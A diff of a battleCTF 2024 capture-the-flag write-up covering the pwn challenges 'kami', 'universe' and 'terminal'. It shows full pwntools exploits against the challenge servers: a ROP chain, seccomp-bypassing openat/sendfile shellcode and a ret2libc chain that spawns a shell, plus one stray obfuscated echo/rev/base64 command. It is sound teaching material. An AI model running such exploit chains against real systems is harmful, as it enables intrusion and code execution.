@@ -125,7 +125,7 @@ $
 We first patch the binary
 
 ```bash
-patchelf kami --set-interpreter ./ld-linux-aarch64.so.1 --set-rpath "./" ka
+patchelf kami --set-interpreter ./ld-linux-aarch64.so.1 --set-rpath "./" kami
 ```
 
 No pie and no stack canary
@@ -158,7 +158,7 @@ undefined8 main(void)
 
 Kami uses a dangerous function `gets` which can be used for buffer overflow 
 
-```cecho 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d
+```c
 
 /* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
 
@@ -189,33 +189,26 @@ We then build the exploit
 from pwn import *
 import re
 
-filename = './patched'
+filename = './kami'
 libc=ELF("./libc.so.6")
 
 target=remote("challenge.bugpwn.com",1000)
 
 leak=target.recv()
 fflush_leak = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
-print(f"fflush address {hex(fflush_leak)}")
 
-libc.address = fflush_leak - 0×00000000006b590 # 0×55008bad1a
-system=libc.address +0×000000000049480
-puts=libc.address +0×00000000006da70
-exit=libc.address +0×00000000003c760
+libc.address = fflush_leak - 0x00000000006b590
+system=libc.address +0x000000000049480
+puts=libc.address +0x00000000006da70
+exit=libc.address +0x00000000003c760
 shell=next(libc.search(b'/bin/sh\x00'))
-
-print(f"libc base address {hex(libc.address)}")
-print(f"puts address {hex(puts)}")
-print(f"shell address {hex(shell)}")
-print(f"exit address {hex(exit)}")
-print(f"system address {hex(system)}")
 
 payload = b''
 payload += 128 * b'A'
 payload += 8 * b'B'
-payload += p64(libc.address + 0×0000000000027b38) 
+payload += p64(libc.address + 0x0000000000027b38) 
 payload += (8 * 3) * b'C'
-payload += p64(libc.address + 0×0000000000049620)
+payload += p64(libc.address + 0x0000000000049620)
 payload += p64(shell)
 payload += (8 * 2) * b'D'
 payload += p64(libc.sym.system)
@@ -223,87 +216,230 @@ target.sendline(payload)
 target.interactive()
 ```
 
-### Universe
-
-Decompiling the binary we find this function `FUN_001012b3`. a mapped reagion is created with `mmap` and marked as `rwx`. it calls a function `FUN_00101208()` and get user input and stores it in the mapped region and executes it.
+Running the code we get the flag
 
 ```bash
-
-undefined8 FUN_001012b3(void)
-
-{
-  code *pcVar1;
-  ssize_t sVar2;
-  int local_c;
-  
-  local_c = 0;
-  pcVar1 = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
-  puts("Africa battleCTF 2024");
-  puts(
-      "By its very subject, cosmology flirts with metaphysics. Because how can we study an object fr om which we cannot extract ourselves? Einstein had this audacity and the Universe once again b ecame an object of science. Without losing its philosophical dimension.\nWhat do you think of the universe?"
-      );
-  fflush(stdout);
-  FUN_00101208();
-  for (; local_c != 0x1000; local_c = local_c + (int)sVar2) {
-    sVar2 = read(0,pcVar1 + local_c,(long)(0x1000 - local_c));
-  }
-  (*pcVar1)();
-  return 0;
-}
+plaintext@archlinux ~/D/c/kami> python sol.py
+[*] '/home/plaintext/Downloads/ctf/kami/libc.so.6'
+    Arch:       aarch64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[+] Opening connection to challenge.bugpwn.com on port 1000: Done
+[*] Switching to interactive mode
+$ ls
+flag.txt
+kami
+sh
+$ cat flag.txt
+battleCTF{0n_Th3_W4yT0_Pwn_IOT_ARM_4f2cc97958831e0481a9a62304b6704a}
 ```
 
-The function setups seccomp rules to limit syscalls 
+### Terminal
+
+32 bit binary with no canary and no pie.
+
+```bash
+plaintext@archlinux ~/D/ctf> checksec terminal 
+[*] '/home/plaintext/Downloads/ctf/terminal'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+```
+
+Decompiling the code in binary ninja we get this function with a while loop
 
 ```c
-
-void FUN_00101208(void)
+int32_t sub_804974d()
 
 {
-  DAT_00104078 = seccomp_init(0x7fff0000);
-  if (DAT_00104078 == 0) {
-    seccomp_reset(0,0x7fff0000);
-                    /* WARNING: Subroutine does not return */
-    _exit(-1);
-  }
-  seccomp_arch_add(DAT_00104078,0xc000003e);
-  FUN_001011c9(2);
-  FUN_001011c9(0x38);
-  FUN_001011c9(0x39);
-  FUN_001011c9(0x3a);
-  FUN_001011c9(0x3b);
-  FUN_001011c9(0x55);
-  FUN_001011c9(0x142);
-  seccomp_load(DAT_00104078);
-  return;
+    void* const __return_addr_1 = __return_addr;
+    void* var_10 = &arg_4;
+    sub_804968c();
+    
+    while (true)
+    {
+        fflush(*(uint32_t*)stdout);
+        void* const var_2c;
+        printf("\x1b[0;32mCLI@RAVEN\x1b[0;37m# ", var_2c);
+        fflush(*(uint32_t*)stdout);
+        sub_8049648();
+        char* eax_3 = strchr(&data_804c060, 0xa);
+        
+        if (eax_3 != 0)
+            *(uint8_t*)eax_3 = 0;
+        
+        var_2c = &data_804a244;
+        char* eax_5 = strtok(&data_804c060, &data_804a244);
+        
+        if (eax_5 != 0)
+        {
+            char* eax_6 = strtok(nullptr, &data_804a244);
+            char* eax_7 = strtok(nullptr, &data_804a244);
+            
+            if (strcmp(eax_5, "show") != 0)
+            {
+                var_2c = "clear";
+                
+                if (strcmp(eax_5, "clear") != 0)
+                {
+                    var_2c = "exit";
+                    
+                    if (strcmp(eax_5, "exit") == 0)
+                        break;
+                    
+                    puts("Invalid command. Type 'show help…");
+                }
+                else
+                    sub_8049722();
+            }
+            else
+            {
+                var_2c = &data_804a24b;
+                
+                if ((strcmp(eax_6, &data_804a24b) == 0 && eax_7 == 0))
+                {
+                    sub_8049226();
+                    continue;
+                }
+                
+                var_2c = &data_804a04c;
+                
+                if ((strcmp(eax_6, &data_804a04c) == 0 && eax_7 == 0))
+                {
+                    sub_8049255();
+                    continue;
+                }
+                
+                var_2c = "down";
+                
+                if ((strcmp(eax_6, "down") == 0 && eax_7 == 0))
+                {
+                    sub_804939c();
+                    continue;
+                }
+                
+                var_2c = "logs";
+                
+                if ((strcmp(eax_6, "logs") == 0 && eax_7 == 0))
+                {
+                    sub_80494e3();
+                    continue;
+                }
+                
+                var_2c = "help";
+                
+                if ((strcmp(eax_6, "help") == 0 && eax_7 == 0))
+                {
+                    sub_80495a0();
+                    continue;
+                }
+                
+                puts("Invalid command. Type 'show help…");
+            }
+        }
+    }
+    
+    puts("Exiting...");
+    return 0;
 }
 ```
 
-using seccomp-tools we find the following syscalls are restricted
+It runs this code to get the user input which uses a dangerous function 
 
-```bash
-open,clone,fork,vfork,execve,creat,execveat
+```c
+char* sub_8049648()
+
+{
+    void buf;
+    read(0, &buf, 0xc8);
+    return strcpy(&data_804c060, &buf);
+}
+
 ```
 
-To bypass the checks we use `openat` and `sendfile`.
+We get the offset is `62`. 0x3a + 4 = 62.
+
+```c
+08049662  8d45c6             lea     eax, [ebp-0x3a {buf}]
+```
+
+To exploit the binary we need use elf.sym.puts to leak elf.got.strcpy in the got. calculate LIBC base address, get `/bin/sh` , `system` and `puts` address. Create a rop chain to spawn `/bin/sh` using ret2libc. The exploit did not first work because of the libc version in use i used libc.rip using the leaked puts address `0xf7d93aa0` to get a version. i then downloaded https://libc.rip/download/libc6-i386_2.39-0ubuntu8_amd64.so.
+
+![img-description](5.png)
+
+We then update the libc version
 
 ```python
 from pwn import *
 
-context.update(arch="amd64",os="linux")
-filename = './universe'
+filename = './terminal'
 e = elf = ELF(filename)
 
-target=remote("challenge.bugpwn.com",1004)
+target=remote("20.199.76.210",1005)
+libc=ELF("./libc6-i386_2.39-0ubuntu8_amd64.so")
+main=0x8049757
+offset=62
 
-target.recvuntil(b'What do you think of the universe?\n')
-shellcode = shellcraft.openat(-100, "/flag.txt",0)
-shellcode += shellcraft.sendfile(1, 3, 0×0, 4000)
-shellcode=asm(shellcode)
-payload=shellcode + b'\x00' * (0×1000-len(shellcode))
+rop=b""
+rop+=p32(elf.plt.puts)
+rop+=p32(main)
+rop+=p32(elf.got.strcpy)
+payload=b"A" * offset + rop
+target.sendlineafter(b'#',payload)
 
-for i in range(0×1000):
-  target.send(chr(payload[i]))
+leaked_addresses=[]
+for i in range(6):
+  leaked_addresses.append((hex(u32(target.recv(4).strip().ljust(4,b"\x00")))))
+
+puts_index=(leaked_addresses.index("0x80490d6")) - 1
+puts_leak=int(leaked_addresses[puts_index],0)
+
+print("puts address : " + str(hex(puts_leak)))
+libc.address=puts_leak-libc.sym['puts']
+system=libc.symbols['system']
+puts=libc.symbols['puts']
+exit_fn=libc.symbols['exit']
+shell=next(libc.search(b'/bin/sh\x00'))
+
+rop=b""
+rop+=p32(system)
+rop+=p32(exit_fn)
+rop+=p32(shell)
+payload=b"A" * offset + rop
+target.sendlineafter(b'#',payload)
 target.interactive()
+```
+
+Running the code we get the flag
+
+```bash
+plaintext@archlinux ~/D/ctf> python terminal.py
+[*] '/home/plaintext/Downloads/ctf/terminal'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+[+] Opening connection to 20.199.76.210 on port 1005: Done
+[*] '/home/plaintext/Downloads/ctf/libc6-i386_2.39-0ubuntu8_amd64.so'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+puts address : 0xf7d93aa0
+[*] Switching to interactive mode
+ $ ls
+flag.txt
+services.txt
+services_logs.txt
+terminal
+$ cat flag.txt
+battleCTF{ret2CLI@dlresolve_a22c24101f31bb15ea7ac818364c980c3fd8ab0a9ed99f023a5c6910a30ee52d}
 ```
 
 ## Forensics
